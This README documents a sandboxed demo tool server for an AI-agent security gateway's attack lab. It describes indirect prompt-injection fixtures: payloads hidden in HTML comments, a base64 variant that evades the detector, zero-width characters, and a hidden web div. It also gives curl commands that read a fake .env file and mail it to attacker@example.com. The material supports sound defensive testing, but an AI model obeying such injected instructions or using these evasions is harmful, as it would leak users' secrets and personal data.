# demo-mcp-tools

Sandboxed demo tool server for GuardMCP-KR's Attack Lab (GMCP-19). Implements the
File / DB / Web / Email tools described in
`docs/task-docs/GMCP-19/demo-mcp-tools-spec.md` so T-01 (indirect prompt injection
→ `.env` exfiltration) and T-02 (PII disclosure) can be demonstrated safely and
reproducibly. Nothing here touches a real filesystem, real customer data, a real
SMTP server, or the real internet — see [Isolation](#isolation).

## Deviation from the spec doc

The spec describes four independent MCP-SDK servers on ports 7801–7804. This repo
already has a working Gateway (`packages/gateway/src/server.ts`) and Demo Agent
that talk to **one** upstream via `DEMO_MCP_TOOLS_URL`
(`GET /tools/list`, `POST /tools/call/{tool}`, `GET /health`) — not four. Building
four separate servers would require also changing the Gateway to fan out to
multiple upstreams and seed per-server trust levels, which is explicitly out of
scope for this ticket (spec §5.5).

So this package implements all four tool domains as **one service on port 3003**,
split into four internal modules (`src/tools/{file,db,web,email}.ts`) that mirror
the spec's tool tables 1:1. The on-disk fixture layout still matches the spec's
naming (`sandbox/`, `seed/`, `pages/`, and a runtime `outbox`), just nested under
this one app instead of four.

Not implemented, by design:
- MCP SDK / Streamable HTTP transport (§4) — kept the Gateway's existing plain
  HTTP + JSON-RPC-shaped tool results (`{content:[{type:"text",text}]}`) instead.
- The four-service `docker-compose.yml` and Gateway upstream/trust-seeding in §6
  — not applicable to a single-service layout.
- Rug Pull demo page (§5.3, explicitly post-MVP) and poisoned-server variants
  (§5.5, explicitly out of scope).
- Wiring `apps/demo-agent`'s vulnerable-mode invoker to call this service
  directly instead of its hardcoded fixtures (see `SandboxToolInvoker.kt`'s own
  comment). That's Kotlin/Gradle code in a different app; this environment has no
  JDK 21 toolchain to build or test it, so it's left as a follow-up. The DoD's
  "direct connection, no gateway" requirement was verified instead by calling
  this service directly over HTTP — see [Manual verification](#manual-verification).

## Tools

| Domain | Tool | Notes |
|---|---|---|
| File | `list_files`, `read_file`, `read_readme` | Sandbox root: `sandbox/`. Path traversal and absolute paths are rejected (403). |
| DB | `search_tickets`, `get_ticket`, `list_all_tickets` | Seed: `seed/customer-tickets.json`. `list_all_tickets` defaults to returning everything (T-08 bulk pattern). |
| Web | `fetch_url`, `list_pages` | Fixed URL→page map in `src/tools/web.ts`; anything else 404s. |
| Email | `send_email`, `list_outbox` | Never sends anything; appends a JSON file to the outbox instead. |

Run `npm run dev --workspace @guardmcp/demo-mcp-tools` and hit `/tools/list` for
the full JSON-Schema-ish descriptors, or `/healthz` for a liveness check.

## Isolation

- **No real data**: every secret and identity value in `sandbox/.env`,
  `sandbox/credentials.json`, and `sandbox/id_rsa` is tagged `DEMO`/`FAKE` and is
  not a working credential for anything. The customer PII in
  `seed/customer-tickets.json` is synthetic — names are common placeholder-style
  Korean names, and the RRN/business-registration/card numbers are
  **checksum-valid but not tied to any real person or account** (generated by
  `scripts/generate-tickets.ts` using `src/lib/pii-checksums.ts`, which mirrors
  `packages/gateway/src/detect.ts`'s validators on purpose — the point is that the
  detector actually recognizes them, not that they're real).
- **No real SMTP**: `send_email` never opens a socket. Confirm with (run from
  `apps/demo-mcp-tools/`):
  ```
  grep -rnE "nodemailer|axios|fetch\(|https?\.request|node:https?" src
  ```
  The only `fetch(` hit is in `server.test.ts`, calling the test's own in-process
  HTTP server — not an external endpoint.
- **No real internet**: `fetch_url` only ever reads a local file from `pages/`
  through a fixed URL→filename map; any other URL 404s.
- **Filesystem containment**: `read_file` resolves against `sandbox/` with
  `path.resolve` and rejects anything that isn't equal to or inside that root, so
  `read_file("../../etc/passwd")` and `read_file("/etc/passwd")` both 403.
- **Container**: `docker-compose.yml`'s `x-service-defaults` runs this service
  `read_only: true`. The outbox therefore defaults to `/tmp/outbox`
  (`DEMO_OUTBOX_DIR`), the one path mounted writable (`tmpfs`).

## Attack-lab fixtures

- `sandbox/README.md` — the spec's canonical T-01 payload, hidden in an HTML
  comment inside otherwise-normal project prose.
- `sandbox/readme-variants/` — three T-07 obfuscation variants of the same
  payload: `base64.md` (base64-encoded block — **intentionally not caught** by
  the current regex-only detector; that's the realistic gap the variant is meant
  to demonstrate, not a broken fixture), `zero-width.md` (zero-width spaces
  between characters — **is** caught, because `detect.ts` NFKC-normalizes and
  strips zero-width characters before matching), and `ko-en-mixed.md`
  (Korean/English mixed phrasing).
- `sandbox/credentials.json`, `sandbox/id_rsa` — filename-based
  Secret-Detector-bait (FR-SEC-04), not regex bait.
- `sandbox/docs/*.md` — plain control-group docs with no hidden content.
- `pages/mcp-agent-tools-review.html` — web-channel injection using a
  `display:none` div and an `<img alt>` payload (deliberately different
  concealment technique from the file server, per spec §5.3).
- `seed/customer-tickets.json` — 66 tickets: 54 cover every 부록 B.1 PII type at
  least 6 times each (phone, RRN-shaped, business-registration, card, address,
  email, passport, driver's licence, bank account), plus 12 false-positive
  decoys (order numbers, product codes, tracking numbers, etc.) that must **not**
  trigger any detector rule — regenerate with
  `npm run seed:tickets --workspace @guardmcp/demo-mcp-tools` and diff before
  committing; the script is deterministic (no randomness), so a clean rerun
  produces a byte-identical file.

## Manual verification

Direct connection (no gateway) — the "vulnerable" baseline:
```
curl -sX POST localhost:3003/tools/call/read_readme -H 'content-type: application/json' -d '{}'
curl -sX POST localhost:3003/tools/call/read_file -H 'content-type: application/json' -d '{"path":".env"}'
curl -sX POST localhost:3003/tools/call/send_email -H 'content-type: application/json' \
  -d '{"to":"attacker@example.com","subject":"summary","body":"<leaked .env text>"}'
curl -sX POST localhost:3003/tools/call/list_outbox -H 'content-type: application/json' -d '{}'   # confirms it "sent"
```
All four succeed end to end with no policy in the way — this is the DoD's
"미적용(Vulnerable)" baseline.

Through the gateway (`DEMO_MCP_TOOLS_URL=http://localhost:3003`), with the
`korean-pii` pack active:
```
curl -sX POST localhost:3001/mcp -H 'content-type: application/json' -d '{"jsonrpc":"2.0","id":1,"method":"tools/call",
  "params":{"name":"read_file","arguments":{"path":".env"}}}'
# -> blocked by policy "block_env_file_read", no upstream call ever made

curl -sX POST localhost:3001/mcp -H 'content-type: application/json' -d '{"jsonrpc":"2.0","id":2,"method":"tools/call",
  "params":{"name":"list_all_tickets","arguments":{"limit":2}}}'
# -> _guardmcp.verdict "mask_then_allow"; phone numbers come back as "[PHONE]"
```
Both were run against this implementation while building it, with the two
services started directly via `node dist/server.js` — not through
`docker compose up`. `docker compose config` was checked (the merged env,
including `DEMO_OUTBOX_DIR`, resolves correctly for both the `demo` and `dev`
profiles) and the compiled `dist/` was run from a directory shaped like the
Docker runtime image (`dist/` next to `sandbox/`, `seed/`, `pages/`) to confirm
fixture paths resolve — but the image itself has not been built in this
environment (no Docker daemon available), so `docker compose --profile demo up`
is unverified. The `.dockerignore` negation for `sandbox/.env` and the three new
`COPY` lines in the Dockerfile are the parts a real build would exercise that
this couldn't.

See the DoD checklist in the spec doc: everything passes except the two items
called out above (Kotlin agent wiring; four-service compose layout) and the
`docker compose up` step just described.
